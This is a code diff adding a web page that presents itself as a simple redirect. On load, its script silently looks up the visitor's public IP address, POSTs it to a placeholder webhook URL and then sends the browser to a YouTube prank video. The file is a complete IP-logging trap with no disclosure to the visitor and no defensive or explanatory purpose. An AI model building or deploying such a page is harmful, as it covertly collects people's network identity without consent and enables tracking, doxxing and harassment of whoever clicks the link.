@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Redirecting...</title>
+  <script>
+    async function sendIPAndRedirect() {
+      try {
+        // 1. Get public IP
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+
+        // 2. Send to webhook
+        await fetch("https://your-webhook-url.com", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: `IP: ${ipData.ip}` })
+        });
+
+        // 3. Redirect to YouTube
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+      } catch (e) {
+        console.error("Failed to send IP or redirect:", e);
+      }
+    }
+
+    sendIPAndRedirect();
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
